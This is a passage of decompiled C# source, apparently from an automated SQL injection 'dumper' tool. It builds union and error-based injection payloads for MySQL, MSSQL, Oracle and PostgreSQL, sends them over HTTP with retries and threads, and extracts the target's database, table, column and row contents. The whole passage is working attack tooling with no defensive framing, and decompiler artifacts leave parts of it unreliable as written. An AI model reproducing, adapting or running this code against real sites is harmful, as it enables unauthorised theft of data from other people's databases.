					if (this.method_10() && this.types_0 == Types.PostgreSQL_No_Error)
					{
						text = this.string_5;
						int num4 = this.int_1 - 1;
						for (int l = 0; l <= num4; l++)
						{
							string text6 = "[t]";
							if (this.enum5_0 != Dumper.Enum5.const_5)
							{
								text6 = PostgreSQL.Dump(text6, injectionType3, string_9, string_10, list_2, postgreSQLErrorType, this.int_1 * int_3 + l, string_11, string_12, "", "");
							}
							else
							{
								text6 = PostgreSQL.Dump(text6, injectionType3, "", "", list_2, postgreSQLErrorType, this.int_1 * int_3 + l, string_11, string_12, "", "(" + this.class45_0.method_0(0).Query + ")");
							}
							if (l == 0)
							{
								text = text.Replace("[t]", text6);
							}
							else
							{
								text = text.Replace("[t" + Conversions.ToString(l), text6);
							}
						}
					}
					else if (this.enum5_0 != Dumper.Enum5.const_5)
					{
						text = PostgreSQL.Dump(text, injectionType3, string_9, string_10, list_2, postgreSQLErrorType, int_3, string_11, string_12, "", "");
					}
					else
					{
						text = PostgreSQL.Dump(text, injectionType3, "", "", list_2, postgreSQLErrorType, int_3, string_11, string_12, "", "(" + this.class45_0.method_0(0).Query + ")");
					}
					break;
				}
				break;
			}
			}
			return text;
		}
	}

	// Token: 0x0600067A RID: 1658 RVA: 0x000288B4 File Offset: 0x00026AB4
	private int method_19(Schema schema_0, string string_9, string string_10, ref string string_11)
	{
		int num = -1;
		string text = "";
		string text2 = "[t]";
		if ((this.enum5_0 > Dumper.Enum5.const_0) & (this.enum5_0 != Dumper.Enum5.const_5))
		{
			text = Conversions.ToString(Interaction.IIf(Conversions.ToBoolean(this.method_7(this.chkDumpWhere)), RuntimeHelpers.GetObjectValue(this.method_7(this.txtSchemaWhere)), ""));
			this.method_15(ref text);
		}
		checked
		{
			try
			{
				if (this.types_0 == Types.MySQL_No_Error)
				{
					if (this.enum5_0 != Dumper.Enum5.const_5)
					{
						text2 = MySQLNoError.Count(text2, this.method_14(), schema_0, string_9, string_10, text, "");
					}
					else
					{
						List<string> list = new List<string>();
						list.Add("count(0)");
						string query = this.class45_0.method_0(0).Query;
						text2 = MySQLNoError.Dump(text2, this.method_14(), false, false, "", "", list, 0, 1, "", "", "", query);
					}
				}
				else if (this.types_0 == Types.MySQL_With_Error)
				{
					object obj = this.method_7(this.cmbOracleErrType);
					MySQLErrorType mySQLErrorType;
					if (Operators.ConditionalCompareObjectEqual(obj, 0, false))
					{
						mySQLErrorType = MySQLErrorType.DuplicateEntry;
					}
					else if (Operators.ConditionalCompareObjectEqual(obj, 1, false))
					{
						mySQLErrorType = MySQLErrorType.ExtractValue;
					}
					else if (Operators.ConditionalCompareObjectEqual(obj, 2, false))
					{
						mySQLErrorType = MySQLErrorType.UpdateXML;
					}
					if (this.enum5_0 != Dumper.Enum5.const_5)
					{
						text2 = MySQLWithError.Count(text2, this.method_14(), mySQLErrorType, schema_0, string_9, string_10, text, "");
					}
					else
					{
						List<string> list2 = new List<string>();
						list2.Add("count(0)");
						string query2 = this.class45_0.method_0(0).Query;
						text2 = MySQLWithError.Dump(text2, this.method_14(), mySQLErrorType, false, "", "", list2, 0, 1, "", "", "", query2);
					}
				}
				else if ((this.types_0 == Types.MSSQL_No_Error) | (this.types_0 == Types.MSSQL_With_Error))
				{
					Types types = this.types_0;
					InjectionType injectionType;
					if (types != Types.MSSQL_No_Error)
					{
						if (types == Types.MSSQL_With_Error)
						{
							injectionType = InjectionType.Error;
						}
					}
					else
					{
						injectionType = InjectionType.Union;
					}
					bool flag = Conversions.ToBoolean(this.method_7(this.chkMSSQL_Latin1));
					bool flag2 = Conversions.ToBoolean(this.method_7(this.chkMSSQLCastAsChar));
					if (this.enum5_0 == Dumper.Enum5.const_5)
					{
						return 32767;
					}
					text2 = MSSQL.Count(text2, injectionType, Conversions.ToString(flag2), flag, schema_0, string_9, string_10, text, "");
				}
				else if ((this.types_0 == Types.Oracle_No_Error) | (this.types_0 == Types.Oracle_With_Error))
				{
					bool flag3 = Conversions.ToBoolean(this.method_7(this.chkOracleCastAsChar));
					Types types2 = this.types_0;
					InjectionType injectionType2;
					if (types2 != Types.Oracle_No_Error)
					{
						if (types2 == Types.Oracle_With_Error)
						{
							injectionType2 = InjectionType.Error;
						}
					}
					else
					{
						injectionType2 = InjectionType.Union;
					}
					bool flag4;
					OracleErrorType oracleErrorType;
					if ((flag4 = true) == (this.types_0 == Types.Oracle_No_Error))
					{
						oracleErrorType = OracleErrorType.NONE;
					}
					else if (Operators.ConditionalCompareObjectEqual(flag4, Operators.CompareObjectEqual(this.method_7(this.cmbOracleErrType), 0, false), false))
					{
						oracleErrorType = OracleErrorType.GET_HOST_ADDRESS;
					}
					else if (Operators.ConditionalCompareObjectEqual(flag4, Operators.CompareObjectEqual(this.method_7(this.cmbOracleErrType), 1, false), false))
					{
						oracleErrorType = OracleErrorType.DRITHSX_SN;
					}
					else if (Operators.ConditionalCompareObjectEqual(flag4, Operators.CompareObjectEqual(this.method_7(this.cmbOracleErrType), 2, false), false))
					{
						oracleErrorType = OracleErrorType.GETMAPPINGXPATH;
					}
					if (this.enum5_0 == Dumper.Enum5.const_5)
					{
						return 32767;
					}
					text2 = Oracle.Count(text2, injectionType2, oracleErrorType, flag3, schema_0, string_9, string_10, text, "");
				}
				else
				{
					if (!((this.types_0 == Types.PostgreSQL_No_Error) | (this.types_0 == Types.PostgreSQL_With_Error)))
					{
						Interaction.MsgBox("FIX ME ", MsgBoxStyle.OkOnly, null);
						return -1;
					}
					Types types3 = this.types_0;
					PostgreSQLErrorType postgreSQLErrorType;
					InjectionType injectionType3;
					if (types3 != Types.PostgreSQL_No_Error)
					{
						if (types3 == Types.PostgreSQL_With_Error)
						{
							postgreSQLErrorType = PostgreSQLErrorType.CAST_INT;
							injectionType3 = InjectionType.Error;
						}
					}
					else
					{
						postgreSQLErrorType = PostgreSQLErrorType.NONE;
						injectionType3 = InjectionType.Union;
					}
					if (this.enum5_0 == Dumper.Enum5.const_5)
					{
						return 32767;
					}
					text2 = PostgreSQL.Count(text2, injectionType3, postgreSQLErrorType, schema_0, string_9, string_10, text, "");
				}
				int num2 = Conversions.ToInteger(this.method_7(this.numMaxRetry));
				Conversions.ToInteger(this.method_7(this.numSleep));
				while (!this.WorkedRequestStop())
				{
					HTTPExt httpext = null;
					string text3 = this.method_26(ref text2, ref string_11, ref httpext);
					if (string.IsNullOrEmpty(text3))
					{
						int num3;
						if (num3 < num2)
						{
							num3++;
							continue;
						}
					}
					else
					{
						List<string> list3 = this.method_17(text3, Types.None, false);
						if (list3.Count <= 0)
						{
							break;
						}
						try
						{
							foreach (string text4 in list3)
							{
								int num4 = Conversions.ToInteger(text4);
								if (Versioned.IsNumeric(num4))
								{
									num = num4;
									break;
								}
							}
							break;
						}
						finally
						{
							List<string>.Enumerator enumerator;
							((IDisposable)enumerator).Dispose();
						}
					}
					string_11 = global::Globals.translate_0.GetStr(this, 30, "");
					break;
				}
			}
			catch (Exception ex)
			{
				string_11 = "Error: " + ex.StackTrace;
			}
			finally
			{
			}
			return num;
		}
	}

	// Token: 0x0600067B RID: 1659 RVA: 0x00028E04 File Offset: 0x00027004
	private List<string> method_20(Schema schema_0, string string_9, string string_10, List<string> list_2, int int_3, int int_4, string string_11, string string_12, ref string string_13, Dumper.Class47 class47_0 = null, int int_5 = -1, ref HTTPExt httpext_0 = null)
	{
		List<string> list = new List<string>();
		checked
		{
			try
			{
				try
				{
					bool flag = Conversions.ToBoolean(this.method_7(this.chkDumpEncodedHex));
					int num = Conversions.ToInteger(this.method_7(this.numMaxRetry));
					Conversions.ToInteger(this.method_7(this.numSleep));
					Types types = this.types_0;
					if (types == Types.MySQL_No_Error || types == Types.MySQL_With_Error)
					{
						if (schema_0 == Schema.INFO || schema_0 == Schema.ROWS)
						{
							flag = Conversions.ToBoolean(this.method_7(this.chkDumpEncodedHex));
						}
					}
					string text = this.method_18(schema_0, string_9, string_10, list_2, int_3, int_4, string_11, string_12, ref string_13, class47_0, int_5);
					while (!this.WorkedRequestStop())
					{
						if (!this.WorkedRequestRetryExceeded(0))
						{
							string text2 = this.method_26(ref text, ref string_13, ref httpext_0);
							if (string.IsNullOrEmpty(text2))
							{
								if (string.IsNullOrEmpty(string_13))
								{
									string_13 = global::Globals.translate_0.GetStr(this, 30, "") + ", Index: " + Conversions.ToString(int_3);
								}
								int num2;
								if (!Conversions.ToBoolean(this.enum5_0 == Dumper.Enum5.const_4 && Conversions.ToBoolean(this.method_7(this.chkDumpFieldByField))) && num2 < num)
								{
									num2++;
									continue;
								}
							}
							else
							{
								List<string> list2 = this.method_17(text2, Types.None, false);
								if (list2.Count != 0)
								{
									try
									{
										foreach (string text3 in list2)
										{
											if (flag & !Versioned.IsNumeric(text3))
											{
												text3 = Class23.smethod_19(text3);
											}
											list.Add(text3);
										}
									}
									finally
									{
										List<string>.Enumerator enumerator;
										((IDisposable)enumerator).Dispose();
									}
									string_13 = global::Globals.translate_0.GetStr(this, 31, "") + global::Globals.FormatNumbers(list2.Count, true);
								}
								else
								{
									string_13 = global::Globals.translate_0.GetStr(this, 32, "") + Conversions.ToString(int_3);
								}
							}
						}
						else
						{
							string_13 = this.string_2;
						}
						goto IL_0233;
					}
					string_13 = this.string_3;
				}
				catch (Exception ex)
				{
					string_13 = "Row Index: " + Conversions.ToString(int_3) + " Error: " + ex.ToString();
				}
				IL_0233:;
			}
			finally
			{
			}
			return list;
		}
	}

	// Token: 0x0600067C RID: 1660 RVA: 0x00029098 File Offset: 0x00027298
	private void method_21(Dumper.Class47 class47_0)
	{
		string text = "Empty";
		checked
		{
			try
			{
				try
				{
					Conversions.ToInteger(this.method_7(this.numSleep));
					string text2 = "";
					string text3 = "";
					if ((this.enum5_0 > Dumper.Enum5.const_0) & (this.enum5_0 != Dumper.Enum5.const_5))
					{
						text2 = Conversions.ToString(Interaction.IIf(Conversions.ToBoolean(this.method_7(this.chkDumpWhere)), RuntimeHelpers.GetObjectValue(this.method_7(this.txtSchemaWhere)), ""));
						text3 = Conversions.ToString(Interaction.IIf(Conversions.ToBoolean(this.method_7(this.chkDumpOrderBy)), RuntimeHelpers.GetObjectValue(this.method_7(this.txtSchemaOrderBy)), ""));
						this.method_15(ref text2);
						this.method_15(ref text3);
					}
					string text4 = "";
					int num = Conversions.ToInteger(this.method_7(this.numMaxRetry));
					bool flag = Conversions.ToBoolean(this.method_7(this.chkDumpEncodedHex));
					switch (this.enum5_0)
					{
					case Dumper.Enum5.const_1:
						text4 = this.method_18(Schema.DATABASES, class47_0.DataBase, class47_0.Table, class47_0.Columns, class47_0.Int32_0, class47_0.Int32_1, text2, text3, ref text, class47_0, -1);
						break;
					case Dumper.Enum5.const_2:
						text4 = this.method_18(Schema.TABLES, class47_0.DataBase, class47_0.Table, class47_0.Columns, class47_0.Int32_0, class47_0.Int32_1, text2, text3, ref text, class47_0, -1);
						break;
					case Dumper.Enum5.const_3:
						text4 = this.method_18(Schema.COLUMNS, class47_0.DataBase, class47_0.Table, class47_0.Columns, class47_0.Int32_0, class47_0.Int32_1, text2, text3, ref text, class47_0, -1);
						break;
					}
					while (!this.WorkedRequestStop())
					{
						HTTPExt httpext = null;
						string text5 = this.method_26(ref text4, ref text, ref httpext);
						int num4;
						if (string.IsNullOrEmpty(text5))
						{
							int num2;
							if (num2 < num)
							{
								num2++;
								continue;
							}
							if (string.IsNullOrEmpty(text))
							{
								text = global::Globals.translate_0.GetStr(this, 30, "") + ", Index: " + Conversions.ToString(class47_0.Int32_0);
							}
						}
						else
						{
							List<string> list = this.method_17(text5, Types.None, false);
							if (list.Count != 0)
							{
								try
								{
									foreach (string text6 in list)
									{
										bool flag2;
										if (!flag2)
										{
											flag2 = !string.IsNullOrEmpty(text6);
										}
									}
								}
								finally
								{
									List<string>.Enumerator enumerator;
									((IDisposable)enumerator).Dispose();
								}
								try
								{
									foreach (string text7 in list)
									{
										if (flag & !Versioned.IsNumeric(text7))
										{
											text7 = Class23.smethod_19(text7);
										}
										string[] array = Strings.Split(text7, ",", -1, CompareMethod.Binary);
										int num3 = array.Length - 1;
										int i;
										for (i = 0; i <= num3; i++)
										{
											if ((this.enum5_0 == Dumper.Enum5.const_3) & (this.types_0 == Types.MySQL_No_Error))
											{
												string[] array2 = array[i].Split(new char[] { ':' });
												if (!this.method_53(array2[0]))
												{
													break;
												}
												if (array2[0].Contains(">") | array2[0].Contains("<") | array2[0].Contains("/") | array2[0].Contains(")") | array2[0].Contains("(") | array2[0].Contains("\""))
												{
													break;
												}
											}
											else if (!this.method_53(array[i]))
											{
												break;
											}
										}
										if (i < array.Length - 1)
										{
											array = (string[])Utils.CopyArray(array, new string[i - 1 + 1]);
										}
										switch (this.enum5_0)
										{
										case Dumper.Enum5.const_1:
											foreach (string text8 in array)
											{
												this.method_47(text8);
												num4++;
												Dumper.Class44 @class;
												(@class = this.class44_0).RowsAdded = @class.RowsAdded + 1;
											}
											break;
										case Dumper.Enum5.const_2:
											foreach (string text9 in array)
											{
												this.method_48(class47_0.DataBase, text9);
												num4++;
												Dumper.Class44 @class;
												(@class = this.class44_0).RowsAdded = @class.RowsAdded + 1;
											}
											break;
										case Dumper.Enum5.const_3:
											if (this.types_0 == Types.MySQL_With_Error)
											{
												this.method_49(class47_0.DataBase, class47_0.Table, array[0]);
												Dumper.Class44 @class;
												(@class = this.class44_0).RowsAdded = @class.RowsAdded + 1;
											}
											else
											{
												foreach (string text10 in array)
												{
													this.method_49(class47_0.DataBase, class47_0.Table, text10);
													num4++;
													Dumper.Class44 @class;
													(@class = this.class44_0).RowsAdded = @class.RowsAdded + 1;
												}
											}
											break;
										}
									}
									break;
								}
								finally
								{
									List<string>.Enumerator enumerator2;
									((IDisposable)enumerator2).Dispose();
								}
							}
							text = global::Globals.translate_0.GetStr(this, 32, "") + Conversions.ToString(class47_0.Int32_0);
						}
						IL_0515:
						if (Conversions.ToBoolean(Operators.AndObject(this.method_7(this.chkAllInOneRequest), this.types_0 == Types.MySQL_No_Error)))
						{
							switch (this.enum5_0)
							{
							case Dumper.Enum5.const_1:
							case Dumper.Enum5.const_2:
							case Dumper.Enum5.const_3:
								if (num4 < class47_0.AfectedRows)
								{
									this.dumpLoading_0.method_1(ProgressBarStyle.Blocks);
									List<string> list2 = new List<string>();
									int num5 = num4;
									int num6 = class47_0.AfectedRows - 1;
									int m = num5;
									while (m <= num6)
									{
										int num7 = (int)Math.Round(Math.Round((double)(100 * (m + 1)) / (double)class47_0.AfectedRows));
										this.bckWorker.ReportProgress(num7, "");
										switch (this.enum5_0)
										{
										case Dumper.Enum5.const_1:
										{
											Schema schema = Schema.DATABASES;
											string dataBase = class47_0.DataBase;
											string table = class47_0.Table;
											List<string> list3 = null;
											int num8 = m;
											int num9 = 1;
											string text11 = text2;
											string text12 = text3;
											Dumper.Class47 class2 = null;
											int num10 = -1;
											httpext = null;
											list2 = this.method_20(schema, dataBase, table, list3, num8, num9, text11, text12, ref text, class2, num10, ref httpext);
											break;
										}
										case Dumper.Enum5.const_2:
										{
											Schema schema2 = Schema.TABLES;
											string dataBase2 = class47_0.DataBase;
											string table2 = class47_0.Table;
											List<string> list4 = null;
											int num11 = m;
											int num12 = 1;
											string text13 = text2;
											string text14 = text3;
											Dumper.Class47 class3 = null;
											int num13 = -1;
											httpext = null;
											list2 = this.method_20(schema2, dataBase2, table2, list4, num11, num12, text13, text14, ref text, class3, num13, ref httpext);
											break;
										}
										case Dumper.Enum5.const_3:
										{
											Schema schema3 = Schema.COLUMNS;
											string dataBase3 = class47_0.DataBase;
											string table3 = class47_0.Table;
											List<string> list5 = null;
											int num14 = m;
											int num15 = 1;
											string text15 = text2;
											string text16 = text3;
											Dumper.Class47 class4 = null;
											int num16 = -1;
											httpext = null;
											list2 = this.method_20(schema3, dataBase3, table3, list5, num14, num15, text15, text16, ref text, class4, num16, ref httpext);
											break;
										}
										}
										if (list2.Count != 0)
										{
											try
											{
												foreach (string text17 in list2)
												{
													switch (this.enum5_0)
													{
													case Dumper.Enum5.const_1:
														this.method_47(text17);
														this.UpDateStatus(string.Concat(new string[]
														{
															"[",
															Strings.FormatNumber(m + 1, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
															"/",
															Strings.FormatNumber(class47_0.AfectedRows, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
															"] ",
															this.string_4,
															" dumping missing databases.."
														}), false);
														break;
													case Dumper.Enum5.const_2:
														this.method_48(class47_0.DataBase, text17);
														this.UpDateStatus(string.Concat(new string[]
														{
															"[",
															Strings.FormatNumber(m + 1, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
															"/",
															Strings.FormatNumber(class47_0.AfectedRows, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
															"] ",
															this.string_4,
															" dumping missing tables.."
														}), false);
														break;
													case Dumper.Enum5.const_3:
														this.method_49(class47_0.DataBase, class47_0.Table, text17);
														this.UpDateStatus(string.Concat(new string[]
														{
															"[",
															Strings.FormatNumber(m + 1, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
															"/",
															Strings.FormatNumber(class47_0.AfectedRows, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
															"] ",
															this.string_4,
															" dumping missing columns.."
														}), false);
														break;
													}
													int num17;
													num17++;
													Dumper.Class44 @class;
													(@class = this.class44_0).RowsAdded = @class.RowsAdded + 1;
												}
											}
											finally
											{
												List<string>.Enumerator enumerator3;
												((IDisposable)enumerator3).Dispose();
											}
											if (!this.WorkedRequestStop())
											{
												if (!this.WorkedRequestRetryExceeded(0))
												{
													m++;
													continue;
												}
												text = this.string_2;
												break;
											}
										}
										else
										{
											object obj = this.class44_0;
											lock (obj)
											{
												int num18 = num4;
												int num19 = class47_0.AfectedRows - 1;
												for (int n = num18; n <= num19; n++)
												{
													this.class44_0.list_1.Add(n);
												}
												break;
											}
										}
										text = this.string_3 + ", ";
										IL_08E4:
										num4 = class47_0.AfectedRows;
										goto IL_08EC;
									}
									goto IL_08E4;
								}
								IL_08EC:
								switch (this.enum5_0)
								{
								case Dumper.Enum5.const_1:
									text = global::Globals.translate_0.GetStr(this, 33, "") + " (" + Conversions.ToString(num4) + ")";
									break;
								case Dumper.Enum5.const_2:
									text = global::Globals.translate_0.GetStr(this, 34, "") + " (" + Conversions.ToString(num4) + ")";
									break;
								case Dumper.Enum5.const_3:
									text = global::Globals.translate_0.GetStr(this, 35, "") + " (" + Conversions.ToString(num4) + ")";
									break;
								default:
									Interaction.MsgBox("FIX ME ", MsgBoxStyle.OkOnly, null);
									break;
								}
								break;
							}
						}
						goto IL_09CD;
					}
					goto IL_0515;
				}
				catch (Exception ex)
				{
					text = "Row Index: " + Conversions.ToString(class47_0.Int32_0) + " Error: " + ex.ToString();
					bool flag2 = false;
				}
				IL_09CD:;
			}
			finally
			{
				try
				{
					bool flag2;
					if (flag2)
					{
						if (!this.class44_0.dictionary_0.ContainsKey(class47_0.IndexJob))
						{
							this.class44_0.dictionary_0.Add(class47_0.IndexJob, text);
						}
					}
					else
					{
						if (!this.class44_0.dictionary_1.ContainsKey(class47_0.IndexJob))
						{
							this.class44_0.dictionary_1.Add(class47_0.IndexJob, text);
						}
						if (Conversions.ToBoolean(Operators.OrObject(Operators.AndObject(Operators.NotObject(this.method_7(this.chkAllInOneRequest)), this.types_0 == Types.MySQL_No_Error), this.types_0 != Types.MySQL_No_Error)))
						{
							object obj2 = this.class44_0;
							lock (obj2)
							{
								if (!this.class44_0.list_1.Contains(class47_0.IndexJob))
								{
									this.class44_0.list_1.Add(class47_0.IndexJob);
								}
							}
						}
					}
					this.threadPool_0.Close(class47_0.Thread_0);
				}
				catch (Exception ex2)
				{
				}
			}
		}
	}

	// Token: 0x0600067D RID: 1661 RVA: 0x00029C64 File Offset: 0x00027E64
	private void method_22(Dumper.Class47 class47_0)
	{
		string text = "Empty";
		string text2 = "";
		string text3 = "";
		checked
		{
			try
			{
				HTTPExt http = this.appDomainControl_0.GetHTTP();
				Conversions.ToInteger(this.method_7(this.numSleep));
				bool flag = Conversions.ToBoolean(this.method_7(this.chkDumpFieldByField));
				Conversions.ToBoolean(this.method_7(this.chkDumpEncodedHex));
				string text4 = "";
				List<string> list = new List<string>();
				flag = Conversions.ToBoolean(this.method_7(this.chkDumpFieldByField));
				if ((this.enum5_0 > Dumper.Enum5.const_0) & (this.enum5_0 != Dumper.Enum5.const_5))
				{
					text2 = Conversions.ToString(Interaction.IIf(Conversions.ToBoolean(this.method_7(this.chkDumpWhere)), RuntimeHelpers.GetObjectValue(this.method_7(this.txtSchemaWhere)), ""));
					text3 = Conversions.ToString(Interaction.IIf(Conversions.ToBoolean(this.method_7(this.chkDumpOrderBy)), RuntimeHelpers.GetObjectValue(this.method_7(this.txtSchemaOrderBy)), ""));
					this.method_15(ref text2);
					this.method_15(ref text3);
				}
				bool flag2;
				if (((this.enum5_0 == Dumper.Enum5.const_5) & Class54.smethod_9(this.types_0)) && (this.class45_0.method_0(0).Query.ToLower().Contains("into outfile") | this.class45_0.method_0(0).Query.ToLower().Contains("into dumpfile")))
				{
					flag2 = true;
					bool flag3 = this.method_16(ref text);
				}
				int num;
				if (flag)
				{
					num = Conversions.ToInteger(this.method_7(this.numFieldByField));
					if (num > class47_0.Columns.Count)
					{
						num = class47_0.Columns.Count;
					}
				}
				if (!flag2)
				{
					bool flag3;
					if (Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(this.method_7(this.chkMySQLSplitRows), this.types_0 == Types.MySQL_With_Error), class47_0.Columns.Count == 1)))
					{
						int num2 = Conversions.ToInteger(this.method_7(this.numMaxRetry));
						int num3 = Conversions.ToInteger(this.method_7(this.numMySQLSplitRows));
						int num4 = Conversions.ToInteger(this.method_7(this.numMySQLSplitRowsLenght));
						List<string> list2 = new List<string>();
						int num5 = num3 - 1;
						int i = 0;
						while (i <= num5)
						{
							if (!this.WorkedRequestStop() && !this.WorkedRequestRetryExceeded(0))
							{
								List<string> list3 = new List<string>();
								int num6;
								num6++;
								try
								{
									foreach (string text5 in class47_0.Columns)
									{
										if (i == 0)
										{
											list3.Add(string.Concat(new string[]
											{
												"substr(",
												text5,
												",1,",
												Conversions.ToString(num4),
												")"
											}));
										}
										else
										{
											list3.Add(string.Concat(new string[]
											{
												"substr(",
												text5,
												",",
												Conversions.ToString(num4 * i + 1),
												",",
												Conversions.ToString(num4),
												")"
											}));
										}
									}
								}
								finally
								{
									List<string>.Enumerator enumerator;
									((IDisposable)enumerator).Dispose();
								}
								list2 = this.method_20(Schema.ROWS, class47_0.DataBase, class47_0.Table, list3, class47_0.Int32_0, class47_0.Int32_1, text2, text3, ref text, class47_0, -1, ref http);
								if (list2.Count == 0)
								{
									int num7;
									num7++;
									if (num7 > num2)
									{
										this.class44_0.list_0.Add("Dump failed, row index: " + Conversions.ToString(class47_0.Int32_0) + ", " + Conversions.ToString(class47_0.Int32_1));
										break;
									}
								}
								else if (list.Count == 0)
								{
									list.Add(list2[0]);
								}
								else
								{
									List<string> list4;
									(list4 = list)[0] = list4[0] + list2[0];
								}
								i++;
								continue;
							}
							IL_03EE:
							if (list.Count == 0)
							{
								this.class44_0.list_0.Add(global::Globals.translate_0.GetStr(this, 24, "") + Conversions.ToString(class47_0.Int32_0));
								object obj = this.class44_0;
								lock (obj)
								{
									Dumper.Class44 @class = this.class44_0;
									ref int ptr = ref @class.int_0;
									@class.int_0 = ptr + 1;
									goto IL_0C14;
								}
							}
							try
							{
								foreach (string text6 in list)
								{
									string[] array = Strings.Split(text6, Class54.string_2, -1, CompareMethod.Binary);
									if (!this.bool_5)
									{
										this.method_29(array.Length);
									}
									List<string> list5 = new List<string>();
									foreach (string text7 in array)
									{
										list5.Add(text7);
									}
									this.dumpGrid_0.method_3(list5);
								}
							}
							finally
							{
								List<string>.Enumerator enumerator2;
								((IDisposable)enumerator2).Dispose();
							}
							object obj2 = this.class44_0;
							lock (obj2)
							{
								this.class44_0.int_0 = 0;
							}
							flag3 = true;
							goto IL_0C14;
						}
						goto IL_03EE;
					}
					if (flag & (class47_0.Columns.Count > 1))
					{
						bool flag6 = false;
						List<string> list6 = new List<string>();
						int num8 = class47_0.Columns.Count - 1;
						for (int k = 0; k <= num8; k++)
						{
							list6.Add(" ");
						}
						int num9 = Conversions.ToInteger(this.method_7(this.numMaxRetryColumn));
						int num10 = class47_0.Columns.Count - 1;
						int num11 = num;
						int num12 = 0;
						while (((num11 >> 31) ^ num12) <= ((num11 >> 31) ^ num10) && !this.WorkedRequestStop() && !this.WorkedRequestRetryExceeded(0))
						{
							if (num12 == 0)
							{
								object obj3 = this.list_0;
								lock (obj3)
								{
									if (this.list_0.Count > 0)
									{
										text4 = this.list_0[this.list_0.Count - 1];
										this.list_0.Remove(text4);
									}
									else
									{
										text4 = "";
									}
								}
							}
							List<string> list7 = new List<string>();
							if (Class54.smethod_10(this.types_0))
							{
								list7.AddRange(class47_0.Columns);
							}
							else
							{
								int num13 = num - 1;
								for (int l = 0; l <= num13; l++)
								{
									int num14 = num12 + l;
									if (num14 < class47_0.Columns.Count)
									{
										list7.Add(class47_0.Columns[num14]);
									}
								}
							}
							list = this.method_20(Schema.ROWS, class47_0.DataBase, class47_0.Table, list7, class47_0.Int32_0, class47_0.Int32_1, text2, text3, ref text, class47_0, num12, ref http);
							if (list.Count == 0 || string.IsNullOrEmpty(list[0].Trim()))
							{
								int num15;
								num15++;
								if (num15 > num9)
								{
									this.class44_0.list_0.Add(string.Concat(new string[]
									{
										"Dump failed, row index: ",
										Conversions.ToString(class47_0.Int32_0),
										", ",
										Conversions.ToString(class47_0.Int32_1),
										", column index: ",
										Conversions.ToString(num12)
									}));
								}
								else
								{
									num12--;
								}
							}
							else
							{
								flag6 = true;
								if (string.IsNullOrEmpty(text4))
								{
									if (!this.bool_5)
									{
										this.method_29(0);
									}
									object obj4 = this.dumpGrid_0;
									lock (obj4)
									{
										text4 = this.dumpGrid_0.method_3(list6);
									}
								}
								object obj5 = this.dumpGrid_0;
								lock (obj5)
								{
									string[] array3 = Strings.Split(list[0], Class54.string_2, -1, CompareMethod.Binary);
									int num16 = num - 1;
									for (int m = 0; m <= num16; m++)
									{
										if (m < array3.Length)
										{
											this.dumpGrid_0.method_5(text4, num12 + m, array3[m]);
										}
									}
								}
								object obj6 = this.class44_0;
								lock (obj6)
								{
									this.class44_0.int_0 = 0;
								}
								flag3 = true;
							}
							if (class47_0.TotalThreads == 1)
							{
								if (class47_0.AfectedRows == 32767)
								{
									this.UpDateStatus("[" + Strings.FormatNumber(class47_0.IndexJob + 1, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) + "] " + this.string_4, false);
								}
								else if (num == 1)
								{
									this.UpDateStatus(string.Concat(new string[]
									{
										"[",
										Strings.FormatNumber(class47_0.IndexJob + 1, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
										"/",
										Strings.FormatNumber(class47_0.AfectedRows, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
										"] ",
										this.string_4,
										" ",
										global::Globals.translate_0.GetStr(this, 36, ""),
										" ",
										Conversions.ToString(num12 + 1),
										" / ",
										Conversions.ToString(class47_0.Columns.Count)
									}), false);
								}
								else
								{
									this.UpDateStatus(string.Concat(new string[]
									{
										"[",
										Strings.FormatNumber(class47_0.IndexJob + 1, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
										"/",
										Strings.FormatNumber(class47_0.AfectedRows, 0, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault),
										"] ",
										this.string_4
									}), false);
								}
							}
							num12 += num11;
						}
						if (!flag6)
						{
							object obj7 = this.class44_0;
							lock (obj7)
							{
								Dumper.Class44 class2 = this.class44_0;
								ref int ptr = ref class2.int_0;
								class2.int_0 = ptr + 1;
							}
							this.class44_0.list_0.Add(global::Globals.translate_0.GetStr(this, 24, "") + Conversions.ToString(class47_0.Int32_0));
							goto IL_0C14;
						}
						if (!this.dumpGrid_0.method_4(text4))
						{
							goto IL_0C14;
						}
						object obj8 = this.list_0;
						lock (obj8)
						{
							if (!this.list_0.Contains(text4))
							{
								this.list_0.Add(text4);
							}
							goto IL_0C14;
						}
					}
					list = this.method_20(Schema.ROWS, class47_0.DataBase, class47_0.Table, class47_0.Columns, class47_0.Int32_0, class47_0.Int32_1, text2, text3, ref text, class47_0, -1, ref http);
					if (list.Count == 0)
					{
						this.class44_0.list_0.Add(global::Globals.translate_0.GetStr(this, 24, "") + Conversions.ToString(class47_0.Int32_0));
						object obj9 = this.class44_0;
						lock (obj9)
						{
							Dumper.Class44 class3 = this.class44_0;
							ref int ptr = ref class3.int_0;
							class3.int_0 = ptr + 1;
							goto IL_0C14;
						}
					}
					try
					{
						foreach (string text8 in list)
						{
							string[] array4 = Strings.Split(text8, Class54.string_2, -1, CompareMethod.Binary);
							if (!this.bool_5)
							{
								this.method_29(array4.Length);
							}
							List<string> list8 = new List<string>();
							foreach (string text9 in array4)
							{
								list8.Add(text9);
							}
							this.dumpGrid_0.method_3(list8);
						}
					}
					finally
					{
						List<string>.Enumerator enumerator3;
						((IDisposable)enumerator3).Dispose();
					}
					object obj10 = this.class44_0;
					lock (obj10)
					{
						this.class44_0.int_0 = 0;
					}
					flag3 = true;
				}
				IL_0C14:;
			}
			catch (Exception ex)
			{
				text = "Error: " + ex.ToString();
				bool flag3 = false;
			}
			finally
			{
				try
				{
					bool flag2;
					if (!flag2)
					{
						object obj11 = this.class44_0;
						lock (obj11)
						{
							bool flag3;
							if (flag3)
							{
								Dumper.Class44 class4;
								(class4 = this.class44_0).RowsAdded = class4.RowsAdded + 1;
								if (!this.class44_0.dictionary_0.ContainsKey(class47_0.IndexJob))
								{
									this.class44_0.dictionary_0.Add(class47_0.IndexJob, text);
